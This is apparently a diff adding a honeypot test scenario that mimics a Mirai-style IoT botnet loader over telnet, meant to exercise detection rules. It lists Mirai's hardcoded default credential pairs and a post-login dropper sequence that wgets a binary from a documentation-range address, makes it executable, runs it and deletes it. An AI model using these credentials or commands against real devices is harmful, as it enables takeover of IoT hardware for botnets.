@@ -1,0 +1,39 @@
+# IoT botnet loader over telnet.
+#
+# Reproduces the Mirai-family playbook: try a short list of hardcoded default
+# credentials, and on success run the recognisable busybox/wget sequence to pull
+# a second stage. Exercises: telnet IAC handling, the iot-default-credential and
+# mirai-signature tags, the fake shell, and the iot_default_credentials,
+# mirai_signature and payload_download_attempt rules.
+#
+# The wget URL points at a documentation address (RFC 5737 TEST-NET) and the
+# sensor never fetches it regardless — it only records the request.
+
+name: iot_botnet_mimic
+service: telnet
+description: Mirai-style default-credential login followed by a dropper sequence
+rate_per_second: 8
+count: 12
+
+# Explicit pairs from the Mirai hardcoded list, so the sensor tags them.
+credentials:
+  - [root, xc3511]
+  - [root, vizxv]
+  - [root, admin]
+  - [admin, admin]
+  - [root, "888888"]
+  - [root, xmhdipc]
+  - [support, support]
+  - [root, juantech]
+  - [root, root]
+  - [admin, "1234"]
+
+# The post-login sequence a loader runs once it has a shell.
+commands:
+  - "/bin/busybox ECCHI"
+  - "cat /proc/mounts"
+  - "cat /bin/echo"
+  - "/bin/busybox wget http://198.51.100.77/bins/mirai.arm7 -O /tmp/.x"
+  - "chmod +x /tmp/.x"
+  - "/tmp/.x telnet.mirai"
+  - "rm -rf /tmp/.x"
